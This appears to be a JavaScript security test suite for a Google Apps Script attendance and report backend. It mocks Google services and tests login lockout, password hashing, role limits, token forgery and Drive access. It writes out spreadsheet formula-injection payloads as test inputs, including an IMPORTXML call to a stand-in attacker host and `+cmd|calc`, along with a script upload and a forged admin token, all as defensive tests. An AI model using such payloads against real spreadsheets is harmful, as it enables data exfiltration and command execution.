// Uji keamanan Code.gs (V5) dengan tiruan layanan Google Apps Script.
// Jalankan: node test_codegs.js [path/ke/Code.gs]
const vm = require('vm');
const { FakeSupabase } = require('./fake_supabase.js');
const fs = require('fs');
const crypto = require('crypto');

const path = require('path');
const CODE_PATH = process.argv[2] || path.join(__dirname, '..', 'Code.gs');
const code = fs.readFileSync(CODE_PATH, 'utf8');

// ---------- tiruan layanan ----------
const propsStore = {};
const cacheStore = {};
const toSigned = (buf) => Array.from(buf).map(b => (b > 127 ? b - 256 : b));
const fromSigned = (arr) => Buffer.from(arr.map(b => b & 255));

function fmtDate(d, tz, fmt) {
  const parts = new Intl.DateTimeFormat('en-GB', {
    timeZone: tz || 'Asia/Jakarta', year: 'numeric', month: '2-digit', day: '2-digit',
    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
  }).formatToParts(d).reduce((a, p) => { a[p.type] = p.value; return a; }, {});
  return fmt.replace('yyyy', parts.year).replace('MM', parts.month).replace('dd', parts.day)
    .replace('HH', parts.hour === '24' ? '00' : parts.hour).replace('mm', parts.minute).replace('ss', parts.second);
}

const iter = (arr) => { let i = 0; return { hasNext: () => i < arr.length, next: () => arr[i++] }; };
const log = [];
const trashed = [];
const sharingCalls = [];
const createdFiles = [];
const appended = [];

const rootFolder = { getId: () => 'ROOT', getName: () => 'Root', getUrl: () => 'https://drive/root', getParents: () => iter([]) };
const files = {};            // id -> file mock
function mkFile(id, parents) {
  const f = {
    getId: () => id, isTrashed: () => false, getParents: () => iter(parents),
    setTrashed: () => { trashed.push(id); }, setSharing: (a, p) => { sharingCalls.push(id); },
    getBlob: () => ({ getContentType: () => 'image/png', getBytes: () => [1, 2, 3] }),
    getUrl: () => 'https://drive.google.com/file/d/' + id + '/view', getName: () => id
  };
  files[id] = f; return f;
}
const branchFolderMjn = { getId: () => 'F_MJN', getName: () => 'Cabang_Majenang', getParents: () => iter([rootFolder]) };
const branchFolderCil = { getId: () => 'F_CIL', getName: () => 'Cabang_Cilacap', getParents: () => iter([rootFolder]) };
mkFile('FILE_MJN_0000000000001xxxxxxxxxxx', [branchFolderMjn]);
mkFile('FILE_CIL_0000000000002xxxxxxxxxxx', [branchFolderCil]);
mkFile('FILE_OUTSIDE_000000003xxxxxxxxxxx', [{ getId: () => 'OTHER', getName: () => 'Dokumen Pribadi', getParents: () => iter([]) }]);

const fakeSheetsByName = {};
function fakeSheet(name) {
  return fakeSheetsByName[name] || (fakeSheetsByName[name] = {
    appendRow: (row) => { appended.push({ sheet: name, row }); },
    getLastRow: () => 3, getLastColumn: () => 2,
    getRange: () => ({
      getValues: () => [['2026-11-19', 5000], ['2026-11-18', 7000]],
      getDisplayValues: () => [['2026-11-19', '5000'], ['2026-11-18', '7000']]
    })
  });
}
const fakeSS = (n) => ({
  getId: () => 'SS_' + n, getUrl: () => 'https://docs.google.com/spreadsheets/d/SS_' + n + '/edit',
  getSheetByName: (s) => fakeSheet(s), insertSheet: (s) => fakeSheet(s), getSpreadsheetTimeZone: () => 'Asia/Jakarta'
});

const SB_URL = 'https://testref.supabase.co';
const SB_SERVICE = 'eyJ-service-secret-JANGAN-BOCOR';
const SB_ANON = 'eyJ-anon-public';
const fakeSb = new FakeSupabase({ serviceKey: SB_SERVICE, anonKey: SB_ANON });
function ufetch(url, opt) {
  opt = opt || {};
  const u = new URL(url);
  const payload = opt.payload;
  const body = payload === undefined ? Buffer.alloc(0) : (typeof payload === 'string' ? Buffer.from(payload) : Buffer.from(Array.from(payload).map(b => b & 255)));
  const headers = Object.assign({}, opt.headers || {});
  if (opt.contentType) headers['Content-Type'] = opt.contentType;
  const r = fakeSb.handle({ method: opt.method || 'get', path: u.pathname, query: u.searchParams, headers, body });
  return { getResponseCode: () => r.status, getContentText: () => r.body.toString('utf8'), getContent: () => toSigned(r.body) };
}
const env = {
  console,
  UrlFetchApp: { fetch: ufetch, fetchAll: (reqs) => reqs.map(r => ufetch(r.url, r)) },
  Logger: { log: (m) => log.push(String(m)) },
  PropertiesService: {
    getScriptProperties: () => ({
      getProperty: (k) => (k in propsStore ? propsStore[k] : null),
      setProperty: (k, v) => { propsStore[k] = String(v); },
      setProperties: (o) => { for (const k in o) propsStore[k] = String(o[k]); },
      deleteProperty: (k) => { delete propsStore[k]; },
      getKeys: () => Object.keys(propsStore)
    })
  },
  CacheService: { getScriptCache: () => ({
    get: (k) => (k in cacheStore ? cacheStore[k] : null), put: (k, v) => { cacheStore[k] = String(v); }, remove: (k) => { delete cacheStore[k]; }
  }) },
  LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
  Utilities: {
    Charset: { UTF_8: 'UTF_8' }, DigestAlgorithm: { MD5: 'MD5' },
    getUuid: () => crypto.randomUUID(),
    sleep: () => {},
    computeHmacSha256Signature: (v, k) => toSigned(crypto.createHmac('sha256', k).update(String(v)).digest()),
    computeDigest: (alg, v) => toSigned(crypto.createHash('md5').update(String(v)).digest()),
    base64EncodeWebSafe: (x) => (typeof x === 'string' ? Buffer.from(x, 'utf8') : fromSigned(x)).toString('base64url'),
    base64DecodeWebSafe: (s) => toSigned(Buffer.from(s, 'base64url')),
    base64Encode: (x) => fromSigned(x).toString('base64'),
    base64Decode: (s) => toSigned(Buffer.from(s, 'base64')),
    newBlob: (bytes, ct, name) => ({
      getDataAsString: () => fromSigned(bytes).toString('utf8'), getContentType: () => ct, getName: () => name, getBytes: () => bytes
    }),
    formatDate: fmtDate
  },
  ContentService: { MimeType: { JSON: 'JSON' }, createTextOutput: (t) => ({ _t: t, setMimeType() { return this; } }) },
  Session: { getScriptTimeZone: () => 'Asia/Jakarta' },
  MimeType: { PLAIN_TEXT: 'text/plain' },
  DriveApp: {
    Access: { ANYONE_WITH_LINK: 'ANYONE_WITH_LINK', PRIVATE: 'PRIVATE' }, Permission: { VIEW: 'VIEW', NONE: 'NONE' },
    getFolderById: () => rootFolder,
    getFileById: (id) => { if (files[id]) return files[id]; throw new Error('File not found'); }
  },
  SpreadsheetApp: { openById: (id) => fakeSS(id.replace('SS_', '')) }
};
vm.createContext(env);
vm.runInContext(code, env, { filename: 'Code.gs' });

// stub fungsi berat Drive/Spreadsheet agar uji fokus ke keamanan
env.getOrCreateBranchSpreadsheet = (name) => fakeSS(String(name).replace(/\s/g, ''));
env.ensureBranchPhotoFoldersForSingleBranch = () => {};
env.syncOpLogsTimeFromBranchSpreadsheets = (c) => c;
env.getFolderFotoByKategoriLaporan = () => ({
  getUrl: () => 'https://drive/folder',
  createFile: (blob) => { createdFiles.push(blob); return mkFile('NEWFILE_' + createdFiles.length + '_xxxxxxxxxxxx', [branchFolderMjn]); },
  getFiles: () => iter([])
});

// ---------- kerangka uji ----------
let pass = 0, fail = 0;
function ok(cond, name) {
  if (cond) { pass++; console.log('  ✓ ' + name); } else { fail++; console.log('  ✗ GAGAL: ' + name); }
}
function post(params) { return JSON.parse(env.doPost({ parameter: params })._t); }
function wait(ms) { const e = Date.now() + ms; while (Date.now() < e) {} }
function section(t) { console.log('\n' + t); }
const ADMIN_PW = 'SuperSecret123';
const allProps = () => JSON.stringify(propsStore);

// ======================================================================
section('1. Tanpa login: semua aksi sensitif harus ditolak');
const g = JSON.parse(env.doGet({ parameter: { action: 'get_config' } })._t);
ok(g.status === 'ok' && !g.cloudConfig, 'GET ?action=get_config tidak lagi membocorkan data');
ok(JSON.parse(env.doGet({ parameter: { action: 'delete_records', payload: '{}' } })._t).status === 'ok', 'GET ?action=delete_records tidak menghapus apa pun');
for (const [a, extra] of [['save_config', { cloud_config: '{}' }], ['delete_records', { payload: '{}' }], ['get_photo', { fileId: 'FILE_OUTSIDE_000000003xxxxxxxxxxx' }],
  ['get_sheet_rows', { spreadsheetId: 'SS_x', sheetName: 'Absen_Masuk' }], ['change_admin_password', {}], ['submit_report', { payload: '{"cabang":"Cilacap"}' }], ['', { payload: '{"cabang":"Cilacap"}' }]]) {
  const r = post(Object.assign({ action: a }, extra));
  ok(r.status === 'error' && r.code === 'AUTH_REQUIRED', `POST action="${a}" tanpa token -> AUTH_REQUIRED`);
}
ok(JSON.parse(env.simpanDariWebApp('{"cabang":"Cilacap"}')).code === 'AUTH_REQUIRED', 'google.script.run simpanDariWebApp tanpa authToken ditolak');
ok(post({ action: 'login', role: 'ADMIN', password: 'apa-saja' }).code === 'ADMIN_NOT_CONFIGURED', 'Admin belum dikonfigurasi -> login admin mati (tidak ada password bawaan)');
ok(post({ action: 'login', role: 'ADMIN', password: 'admin123' }).status === 'error' && post({ action: 'login', role: 'ADMIN', password: '1234' }).status === 'error', 'PIN lama admin123 / 1234 tidak berlaku');

// ======================================================================
section('2. Password admin & pembatasan percobaan login');
propsStore.ADMIN_PASSWORD = 'pendek';
ok(post({ action: 'login', role: 'ADMIN', password: 'pendek' }).code === 'WEAK_PASSWORD', 'ADMIN_PASSWORD < 10 karakter ditolak');
propsStore.ADMIN_PASSWORD = ADMIN_PW;
let r = post({ action: 'login', role: 'ADMIN', password: 'salah-1' });
ok(r.code === 'BAD_CREDENTIALS', 'password admin salah ditolak');
ok(!('ADMIN_PASSWORD' in propsStore) && /^[0-9a-f-]{36}\$/.test(propsStore.ADMIN_PASSWORD_HASH), 'password polos dihapus dari Properties & diganti hash bergaram');
ok(!allProps().includes(ADMIN_PW), 'password admin polos tidak ada di penyimpanan manapun');
for (let i = 0; i < 5; i++) post({ action: 'login', role: 'ADMIN', password: 'salah-' + i });
ok(post({ action: 'login', role: 'ADMIN', password: ADMIN_PW }).code === 'LOCKED', 'setelah 6 gagal, akun terkunci (bahkan dengan password benar)');
for (const k in cacheStore) delete cacheStore[k];
r = post({ action: 'login', role: 'ADMIN', password: ADMIN_PW });
ok(r.status === 'success' && r.role === 'ADMIN' && typeof r.token === 'string', 'login admin benar -> token');
const adminTok = r.token;

// ======================================================================
section('3. Migrasi data lama: PIN admin & password polos tidak boleh tersisa');
const legacyCfg = {
  branches: ['Majenang', 'Cilacap'], updatedAt: 1, adminPin: 'admin123', visualTheme: 'pastel-pop',
  employees: [{ id: 'emp-1', name: 'Widia', password: 'widia01', defaultBranch: 'Majenang' }, { id: 'emp-3', name: 'Saskia', password: 'saskia03', defaultBranch: 'Cilacap' }],
  opLogsSummary: [{ id: 'a1', cabang: 'Majenang', recordType: 'DAILY_REPORT', cash: 100000 }, { id: 'b1', cabang: 'Cilacap', recordType: 'DAILY_REPORT', cash: 999999 }],
  branchStockInventory: { Majenang: { x: 1 }, Cilacap: { y: 2 } }
};
env.saveCloudConfigToChunks(JSON.stringify(legacyCfg), false);
ok(!allProps().includes('admin123') && !allProps().includes('widia01') && !allProps().includes('saskia03'), 'penyimpanan config otomatis membuang adminPin & password polos');
env.setupSecurity();
ok(log.some(l => l.includes('SETUP KEAMANAN SELESAI')), 'setupSecurity() berjalan');
const stored = JSON.parse(propsStore.OHSNAP_CLOUD_CONFIG_JSON || '{}');
ok(Array.isArray(stored.employees) && stored.employees.every(e => !e.password && !e.passwordHash), 'kru lama tidak punya password sama sekali -> wajib diset ulang');
ok(post({ action: 'login', role: 'EMPLOYEE', branch: 'Majenang', password: 'widia01' }).status === 'error', 'password lama "widia01" tidak bisa dipakai login lagi');

// ======================================================================
section('4. Admin menyimpan kru: password disimpan sebagai hash');
let adminLoginTok = post({ action: 'login', role: 'ADMIN', password: ADMIN_PW }).token;
const saveRes = post({ action: 'save_config', token: adminLoginTok, cloud_config: JSON.stringify({
  branches: ['Majenang', 'Cilacap'], updatedAt: 2, adminPin: 'HACKED-PIN',
  employees: [{ id: 'emp-1', name: 'Widia', defaultBranch: 'Majenang', password: 'Rahasia123' },
              { id: 'emp-2', name: 'Silfi', defaultBranch: 'Majenang' },
              { id: 'emp-3', name: 'Saskia', defaultBranch: 'Cilacap', password: 'saskia-baru-77' }]
}) });
ok(saveRes.status === 'success', 'admin boleh save_config');
ok(!allProps().includes('Rahasia123') && !allProps().toLowerCase().includes('rahasia123'), 'password kru tidak tersimpan polos');
ok(!allProps().includes('HACKED-PIN') && !allProps().includes('adminPin'), 'adminPin kiriman klien diabaikan');
const resEmps = saveRes.cloudConfig.employees;
ok(resEmps.every(e => !('passwordHash' in e) && !('password' in e)), 'respons save_config tidak membawa hash/password');
ok(resEmps.find(e => e.id === 'emp-1').hasPassword === true && resEmps.find(e => e.id === 'emp-2').hasPassword === false, 'penanda hasPassword benar');
let bad = post({ action: 'save_config', token: adminLoginTok, cloud_config: JSON.stringify({ employees: [{ id: 'emp-9', name: 'Lemah', defaultBranch: 'Majenang', password: 'abc' }] }) });
ok(bad.code === 'WEAK_PASSWORD', 'password kru < 8 karakter ditolak server');
bad = post({ action: 'save_config', token: adminLoginTok, cloud_config: JSON.stringify({ employees: [
  { id: 'emp-7', name: 'A', defaultBranch: 'Majenang', password: 'samapassword1' }, { id: 'emp-8', name: 'B', defaultBranch: 'Majenang', password: 'SAMAPASSWORD1' }] }) });
ok(bad.code === 'DUPLICATE_PASSWORD', 'password kembar dalam 1 cabang ditolak');
// pulihkan daftar kru yang valid (kegagalan di atas tidak mengubah apa pun)
const afterBad = JSON.parse(propsStore.OHSNAP_CLOUD_CONFIG_JSON || '{}');
ok(afterBad.employees.length === 3, 'save yang gagal tidak merusak data tersimpan');

// ======================================================================
section('5. Login kru');
wait(5);
r = post({ action: 'login', role: 'EMPLOYEE', branch: 'Majenang', password: 'rahasia123' });
ok(r.status === 'success' && r.name === 'Widia' && r.branch === 'Majenang', 'login kru benar (tidak peka huruf besar/kecil, sesuai perilaku lama)');
const empTok = r.token;
ok(post({ action: 'login', role: 'EMPLOYEE', branch: 'Cilacap', password: 'Rahasia123' }).code === 'BAD_CREDENTIALS', 'password kru cabang lain tidak bisa dipakai di cabang ini');
ok(post({ action: 'login', role: 'EMPLOYEE', branch: 'Majenang', password: '' }).code === 'BAD_REQUEST', 'password kosong ditolak');
ok(post({ action: 'login', role: 'EMPLOYEE', branch: 'CabangPalsu', password: 'Rahasia123' }).code === 'BAD_REQUEST', 'cabang tidak dikenal ditolak');
ok(post({ action: 'login', role: 'EMPLOYEE', branch: 'Majenang', password: 'admin123' }).status === 'error', 'PIN admin tidak bisa dipakai sebagai login kru');
ok(post({ action: 'login', role: 'SUPERUSER', branch: 'Majenang', password: 'x' }).code === 'BAD_REQUEST', 'peran tidak dikenal ditolak');
for (let i = 0; i < 6; i++) post({ action: 'login', role: 'EMPLOYEE', branch: 'Cilacap', password: 'tebak-' + i });
ok(post({ action: 'login', role: 'EMPLOYEE', branch: 'Cilacap', password: 'saskia-baru-77' }).code === 'LOCKED', 'brute-force login kru dikunci per cabang');
for (const k in cacheStore) delete cacheStore[k];

// ======================================================================
section('6. Pembatasan hak akses peran kru');
for (const [a, extra] of [['save_config', { cloud_config: '{"branches":["X"]}' }], ['delete_records', { payload: '{"deletedOpLogIds":["a1"]}' }], ['change_admin_password', { currentPassword: 'x', newPassword: 'y'.repeat(12) }]]) {
  const rr = post(Object.assign({ action: a, token: empTok }, extra));
  ok(rr.code === 'FORBIDDEN', `kru tidak boleh ${a}`);
}
let cfgEmp = post({ action: 'get_config', token: empTok }).cloudConfig;
ok(cfgEmp.opLogsSummary.length === 1 && cfgEmp.opLogsSummary[0].cabang === 'Majenang', 'kru hanya melihat riwayat cabangnya sendiri (omzet cabang lain tidak bocor)');
ok(Object.keys(cfgEmp.branchStockInventory).join() === 'Majenang', 'kru hanya melihat stok cabangnya');
ok(cfgEmp.employees.every(e => e.defaultBranch === 'Majenang') && !JSON.stringify(cfgEmp).includes('passwordHash') && !JSON.stringify(cfgEmp).includes('adminPin'), 'kru tidak melihat kru cabang lain, hash, maupun PIN');
let cfgAdm = post({ action: 'get_config', token: adminLoginTok }).cloudConfig;
ok(cfgAdm.opLogsSummary.length === 2 && cfgAdm.employees.length === 3 && !JSON.stringify(cfgAdm).includes('passwordHash'), 'admin melihat semua data, tetapi tidak pernah hash/password');
let cfgPub = post({ action: 'get_config' });
ok(cfgPub.authenticated === false && !('employees' in cfgPub.cloudConfig) && !('opLogsSummary' in cfgPub.cloudConfig), 'tanpa token hanya daftar cabang/jadwal (tidak ada kru/omzet)');

// ======================================================================
section('7. Pengiriman laporan');
const rpt = (o) => post({ action: 'submit_report', token: empTok, payload: JSON.stringify(Object.assign({
  recordType: 'ABSEN_MUKA', subType: 'MUKA_DATANG', cabang: 'Majenang', tanggal: '2026-11-19', waktu: '09:00:00', shift: 'Shift Pagi', nama: 'Widia', dedupKey: 'k' + Math.random() }, o)) });
r = rpt({ cabang: 'Cilacap' });
ok(r.code === 'FORBIDDEN', 'kru Majenang tidak bisa mengirim laporan atas nama cabang Cilacap');
r = rpt({ cabang: 'Cabang Palsu' });
ok(r.code === 'BAD_REQUEST', 'cabang karangan ditolak (tidak membuat spreadsheet baru)');
appended.length = 0;
r = rpt({ nama: 'Orang Lain Yang Dipalsukan', catatan: '=IMPORTXML("http://evil.example/x","//a")' });
ok(r.status === 'success', 'laporan sah terkirim');
const rowMasuk = appended.find(a => a.sheet === 'Absen_Masuk');
ok(rowMasuk && rowMasuk.row.includes('Widia') && !rowMasuk.row.includes('Orang Lain Yang Dipalsukan'), 'nama dipaksa dari sesi login (anti pemalsuan)');
ok(rowMasuk && rowMasuk.row.some(c => c === "'=IMPORTXML(\"http://evil.example/x\",\"//a\")"), 'formula injection dinetralkan dengan apostrof');
createdFiles.length = 0; sharingCalls.length = 0; appended.length = 0;
// Foto WAJIB ke Supabase: data foto mentah ditolak, tidak ada yang masuk Drive / Spreadsheet
const inlinePng = 'data:image/png;base64,' + Buffer.from('png-bytes').toString('base64');
const strictKey = 'strict-' + Math.random();
r = rpt({ fotoBukti: inlinePng, dedupKey: strictKey });
ok(r.code === 'SB_REQUIRED' && createdFiles.length === 0 && appended.length === 0, 'data foto mentah ditolak (SB_REQUIRED): tidak ada berkas Drive, tidak ada baris Spreadsheet');
r = rpt({ closePhotosList: [{ label: 'x', base64: inlinePng }] });
ok(r.code === 'SB_REQUIRED' && createdFiles.length === 0, 'data foto mentah di dalam daftar foto juga ditolak');
r = rpt({ dedupKey: strictKey });
ok(r.status === 'success' && !r.duplicateIgnored && appended.length > 0, 'laporan yang gagal boleh langsung dikirim ulang (tidak dianggap klik 2x)');
r = rpt({ dedupKey: strictKey });
ok(r.duplicateIgnored === true, 'klik 2x yang sebenarnya tetap diabaikan');
// Jalur darurat Google Drive (ALLOW_DRIVE_PHOTO_FALLBACK = true)
propsStore.ALLOW_DRIVE_PHOTO_FALLBACK = 'true';
createdFiles.length = 0; sharingCalls.length = 0; appended.length = 0;
r = rpt({ fotoBukti: 'data:text/html;base64,PHNjcmlwdD4=' });
ok(createdFiles.length === 0, 'unggahan non-gambar (text/html) ditolak');
r = rpt({ fotoBukti: 'data:image/png;base64,' + Buffer.from('png-bytes').toString('base64'), nama: 'x' });
ok(createdFiles.length === 1, 'gambar PNG valid diterima');
ok(sharingCalls.length === 0, 'foto baru TIDAK dijadikan publik (tanpa ANYONE_WITH_LINK)');
r = rpt({ fotoBukti: 'data:image/png;base64,' + 'A'.repeat(9 * 1024 * 1024) });
ok(createdFiles.length === 1, 'foto > batas ukuran ditolak');
delete propsStore.ALLOW_DRIVE_PHOTO_FALLBACK;
r = rpt({ closePhotosList: new Array(40).fill({ label: 'x', base64: '' }) });
ok(r.code === 'BAD_REQUEST', 'jumlah foto berlebihan ditolak');
r = post({ action: 'submit_report', token: empTok, payload: JSON.stringify({ recordType: 'ADMIN_SYNC_CONFIG', cabang: 'Majenang', cloudConfig: { branches: ['X'] } }) });
ok(r.code === 'FORBIDDEN', 'kru tidak bisa menyelundupkan ADMIN_SYNC_CONFIG lewat jalur laporan');
r = post({ action: 'submit_report', token: empTok, payload: JSON.stringify({ recordType: 'ADMIN_DELETE_RECORDS', deletedItems: [{ id: 'a1' }] }) });
ok(r.code === 'FORBIDDEN', 'kru tidak bisa menyelundupkan ADMIN_DELETE_RECORDS lewat jalur laporan');

// ======================================================================
section('8. Akses foto Drive');
r = post({ action: 'get_photo', token: adminLoginTok, fileId: 'FILE_OUTSIDE_000000003xxxxxxxxxxx', cabang: 'Majenang' });
ok(r.status === 'not_found', 'file Drive di luar Folder Pusat TIDAK dapat dibaca (sebelumnya: baca file apa pun)');
sharingCalls.length = 0;
r = post({ action: 'get_photo', token: adminLoginTok, fileId: 'FILE_MJN_0000000000001xxxxxxxxxxx', cabang: 'Majenang' });
ok(r.status === 'success' && r.base64.startsWith('data:image/png;base64,'), 'admin dapat membaca foto di dalam Folder Pusat');
ok(sharingCalls.length === 0, 'membaca foto tidak lagi mengubahnya jadi publik');
r = post({ action: 'get_photo', token: empTok, fileId: 'FILE_MJN_0000000000001xxxxxxxxxxx', cabang: 'Majenang' });
ok(r.status === 'success', 'kru dapat membaca foto cabangnya');
r = post({ action: 'get_photo', token: empTok, fileId: 'FILE_CIL_0000000000002xxxxxxxxxxx', cabang: 'Majenang' });
ok(r.status !== 'success' || r.fileId !== 'FILE_CIL_0000000000002xxxxxxxxxxx', 'kru tidak dapat membaca foto cabang lain via fileId');
r = post({ action: 'get_photo', token: empTok, fileId: 'FILE_CIL_0000000000002xxxxxxxxxxx', cabang: 'Cilacap' });
ok(r.code === 'FORBIDDEN', 'kru tidak dapat meminta foto dengan parameter cabang lain');

section('9. Penghapusan file Drive');
trashed.length = 0;
const n1 = env.trashDriveFilesFromUrlText('https://drive.google.com/file/d/FILE_OUTSIDE_000000003xxxxxxxxxxx/view');
ok(n1 === 0 && trashed.length === 0, 'file di luar Folder Pusat TIDAK dibuang ke trash');
const n2 = env.trashDriveFilesFromUrlText('https://drive.google.com/file/d/FILE_MJN_0000000000001xxxxxxxxxxx/view');
ok(n2 === 1 && trashed.includes('FILE_MJN_0000000000001xxxxxxxxxxx'), 'file di dalam Folder Pusat boleh dibuang');

section('10. Baca baris spreadsheet (pengganti gviz publik)');
env.saveCloudConfigToChunks(JSON.stringify(Object.assign(JSON.parse(propsStore.OHSNAP_CLOUD_CONFIG_JSON), {
  branchSpreadsheets: { Majenang: { spreadsheetId: 'SS_Majenang' }, Cilacap: { spreadsheetId: 'SS_Cilacap' } } })), false);
ok(post({ action: 'get_sheet_rows', token: empTok, spreadsheetId: 'SS_Majenang', sheetName: 'Absen_Masuk' }).status === 'success', 'kru membaca sheet cabangnya');
ok(post({ action: 'get_sheet_rows', token: empTok, spreadsheetId: 'SS_Cilacap', sheetName: 'Absen_Masuk' }).code === 'FORBIDDEN', 'kru tidak membaca sheet cabang lain');
ok(post({ action: 'get_sheet_rows', token: adminLoginTok, spreadsheetId: 'SS_Cilacap', sheetName: 'Absen_Masuk' }).status === 'success', 'admin membaca sheet cabang mana pun');
ok(post({ action: 'get_sheet_rows', token: adminLoginTok, spreadsheetId: 'SPREADSHEET_PRIBADI_ORANG', sheetName: 'Absen_Masuk' }).code === 'FORBIDDEN', 'spreadsheet yang tidak terdaftar ditolak');
ok(post({ action: 'get_sheet_rows', token: adminLoginTok, spreadsheetId: 'SS_Majenang', sheetName: 'SheetRahasia' }).code === 'BAD_REQUEST', 'nama sheet di luar template ditolak');

// ======================================================================
section('11. Keaslian, kedaluwarsa & pencabutan token');
const [p64] = empTok.split('.');
const forgedPayload = Buffer.from(JSON.stringify(Object.assign(JSON.parse(Buffer.from(p64, 'base64url').toString()), { r: 'ADMIN' }))).toString('base64url');
ok(post({ action: 'save_config', token: forgedPayload + '.' + empTok.split('.')[1], cloud_config: '{}' }).code === 'AUTH_REQUIRED', 'token dimodifikasi menjadi ADMIN -> ditolak (tanda tangan tidak cocok)');
ok(post({ action: 'save_config', token: 'abc.def', cloud_config: '{}' }).code === 'AUTH_REQUIRED', 'token sembarang ditolak');
const expPayload = Buffer.from(JSON.stringify({ r: 'ADMIN', b: '', n: 'Admin', i: '', iat: Date.now() - 9e6, exp: Date.now() - 1000 })).toString('base64url');
ok(post({ action: 'save_config', token: expPayload + '.' + env.secSign_(expPayload), cloud_config: '{}' }).code === 'AUTH_REQUIRED', 'token kedaluwarsa ditolak');
// ganti password kru -> token lama kru tidak berlaku
const before = post({ action: 'get_config', token: empTok });
ok(before.authenticated === true, 'token kru valid sebelum password diganti');
post({ action: 'save_config', token: adminLoginTok, cloud_config: JSON.stringify({ employees: [
  { id: 'emp-1', name: 'Widia', defaultBranch: 'Majenang', password: 'PasswordBaru-456' }, { id: 'emp-2', name: 'Silfi', defaultBranch: 'Majenang' },
  { id: 'emp-3', name: 'Saskia', defaultBranch: 'Cilacap' }] }) });
wait(5);
ok(post({ action: 'get_config', token: empTok }).authenticated === false, 'password kru diganti -> sesi lama kru otomatis dicabut');
ok(post({ action: 'login', role: 'EMPLOYEE', branch: 'Majenang', password: 'PasswordBaru-456' }).status === 'success', 'login dengan password baru berhasil');
ok(post({ action: 'login', role: 'EMPLOYEE', branch: 'Cilacap', password: 'saskia-baru-77' }).status === 'success', 'kru lain tetap bisa login (hash dipertahankan saat password tidak dikirim ulang)');
// kru dihapus -> token dicabut
const tokS = post({ action: 'login', role: 'EMPLOYEE', branch: 'Cilacap', password: 'saskia-baru-77' }).token;
wait(5);
post({ action: 'save_config', token: adminLoginTok, cloud_config: JSON.stringify({ employees: [{ id: 'emp-1', name: 'Widia', defaultBranch: 'Majenang' }] }) });
wait(5);
ok(post({ action: 'get_config', token: tokS }).authenticated === false, 'kru dihapus admin -> sesinya langsung tidak berlaku');
ok(post({ action: 'login', role: 'EMPLOYEE', branch: 'Cilacap', password: 'saskia-baru-77' }).status === 'error', 'kru yang dihapus tidak bisa login lagi');

section('12. Ganti password admin');
ok(post({ action: 'change_admin_password', token: adminLoginTok, currentPassword: 'salah', newPassword: 'PasswordAdminBaru-99' }).code === 'BAD_CREDENTIALS', 'butuh password admin saat ini');
ok(post({ action: 'change_admin_password', token: adminLoginTok, currentPassword: ADMIN_PW, newPassword: 'pendek' }).code === 'WEAK_PASSWORD', 'password admin baru < 10 karakter ditolak');
ok(post({ action: 'change_admin_password', token: adminLoginTok, currentPassword: ADMIN_PW, newPassword: 'PasswordAdminBaru-99' }).status === 'success', 'ganti password admin berhasil');
ok(post({ action: 'get_config', token: adminLoginTok }).authenticated === false, 'semua sesi admin lama dicabut setelah ganti password');
for (const k in cacheStore) delete cacheStore[k];
ok(post({ action: 'login', role: 'ADMIN', password: ADMIN_PW }).status === 'error', 'password admin lama tidak berlaku');
ok(post({ action: 'login', role: 'ADMIN', password: 'PasswordAdminBaru-99' }).status === 'success', 'password admin baru berlaku');

section('13. Fungsi bantu');
const sc = env.secSafeCell_;
ok(sc('=1+1') === "'=1+1" && sc('+cmd|calc') === "'+cmd|calc" && sc('@SUM(A1)') === "'@SUM(A1)" && sc('-cmd') === "'-cmd", 'secSafeCell_ menetralkan = + @ -');
ok(sc('-') === '-' && sc('-5000') === '-5000' && sc('Halo') === 'Halo' && sc(123) === 123, 'secSafeCell_ tidak merusak teks/angka normal');
ok(env.secEq_('abc', 'abc') && !env.secEq_('abc', 'abd') && !env.secEq_('abc', 'abcd'), 'secEq_ benar');
ok(!/adminPin|"password"/.test(env.secStripConfigSecrets_(JSON.stringify({ adminPin: '1', employees: [{ password: 'x', name: 'n' }] }))), 'secStripConfigSecrets_ membuang adminPin & password');


// ======================================================================
section('14. Foto ke Supabase Storage (laporan tetap ke Spreadsheet)');
let folderCalls = 0;
const origFolderFn = env.getFolderFotoByKategoriLaporan;
env.getFolderFotoByKategoriLaporan = (...a) => { folderCalls++; return origFolderFn(...a); };
for (const k in cacheStore) delete cacheStore[k];
const wTok = post({ action: 'login', role: 'EMPLOYEE', branch: 'Majenang', password: 'PasswordBaru-456' }).token;
const aTok = post({ action: 'login', role: 'ADMIN', password: 'PasswordAdminBaru-99' }).token;
ok(!!wTok && !!aTok, 'login kru & admin untuk bagian foto');

// -- mode nonaktif (properti belum diisi) -> laporan berfoto ditolak server
let r14 = post({ action: 'photo_upload_urls', token: wTok, cabang: 'Majenang', count: 1 });
ok(r14.code === 'SB_DISABLED', 'tanpa konfigurasi Supabase: photo_upload_urls -> SB_DISABLED (server lalu menolak laporan berfoto)');
ok(post({ action: 'photo_view_url', token: wTok, path: 'x' }).code === 'SB_DISABLED', 'tanpa konfigurasi: photo_view_url -> SB_DISABLED');

// -- konfigurasi
propsStore.SUPABASE_URL = SB_URL;
propsStore.SUPABASE_SERVICE_KEY = SB_SERVICE;
propsStore.SUPABASE_ANON_KEY = SB_ANON;
propsStore.PHOTO_VIEWER_URL = 'https://absen.ohsnap.web.id/foto.html';
const allResponses = [];
const postSb = (params) => { const r = post(params); allResponses.push(JSON.stringify(r)); return r; };

ok(postSb({ action: 'photo_upload_urls', cabang: 'Majenang', count: 1 }).code === 'AUTH_REQUIRED', 'photo_upload_urls tanpa login ditolak');
ok(postSb({ action: 'photo_view_url', path: 'x' }).code === 'AUTH_REQUIRED', 'photo_view_url tanpa login ditolak');
ok(postSb({ action: 'photo_upload_urls', token: wTok, cabang: 'Majenang', count: 0 }).code === 'BAD_REQUEST', 'count 0 ditolak');
ok(postSb({ action: 'photo_upload_urls', token: wTok, cabang: 'Majenang', count: 13 }).code === 'BAD_REQUEST', 'count > 12 ditolak');
ok(postSb({ action: 'photo_upload_urls', token: wTok, cabang: 'Cilacap', count: 1 }).code === 'FORBIDDEN', 'kru Majenang tidak boleh meminta izin unggah ke folder Cilacap');
ok(postSb({ action: 'photo_upload_urls', token: wTok, cabang: 'CabangPalsu', count: 1 }).code === 'BAD_REQUEST', 'cabang karangan ditolak');

const up = postSb({ action: 'photo_upload_urls', token: wTok, cabang: 'Majenang', count: 3 });
ok(up.status === 'success' && up.items.length === 3, 'kru mendapat 3 izin unggah');
